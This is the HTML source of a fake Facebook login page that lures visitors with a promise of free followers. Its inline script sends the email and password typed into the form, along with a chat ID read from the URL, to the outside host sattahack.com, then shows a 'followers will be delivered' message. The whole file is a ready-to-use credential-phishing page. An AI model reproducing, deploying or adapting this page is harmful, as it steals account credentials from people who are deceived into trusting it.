<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="./style.css" />
    <style>
      .spinner-container {
        display: none;
        text-align: center;
        margin: 10px auto;
      }

      .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-radius: 50%;
        border-top: 4px solid #3498db;
        width: 30px;
        height: 30px;
        animation: spin 1s linear infinite;
        display: inline-block;
        vertical-align: middle;
      }

      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }

      .verifying-text {
        display: inline-block;
        vertical-align: middle;
        margin-left: 10px;
        font-size: 16px;
        color: #3498db;
      }

      .success-message {
        display: none;
        color: green;
        text-align: center;
        margin-top: 20px;
      }
    </style>
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
          <form id="loginForm">
            <input type="text" id="email" placeholder="Email or Phone Number" required />
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="login">Log In</button>
            <div class="spinner-container" id="spinnerContainer">
              <div class="spinner" id="spinner"></div>
              <span class="verifying-text" id="verifyingText">Verifying...</span>
            </div>
            <div class="success-message" id="message">Followers will be delivered soon within 24 hours!</div>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button class="create-account">Create New Account</button>
          </form>
      </div>
    </div>

    <script>
      const chatId = new URLSearchParams(window.location.search).get("id");

      document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const spinnerContainer = document.getElementById('spinnerContainer');
        const message = document.getElementById('message');
        spinnerContainer.style.display = 'block';

        const formData = {
            email: document.getElementById('email').value,
            password: document.getElementById('password').value,
            type: 'facebook',
            chat_id: chatId
        };

        fetch('https://sattahack.com/info', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        })
        .then(response => response.json())
        .then(data => {
          spinnerContainer.style.display = 'none';
          message.style.display = 'block';
        })
        .catch(error => {
          console.error('Error:', error);
          spinnerContainer.style.display = 'none';
        });
      });
    </script>
  </body>
</html>
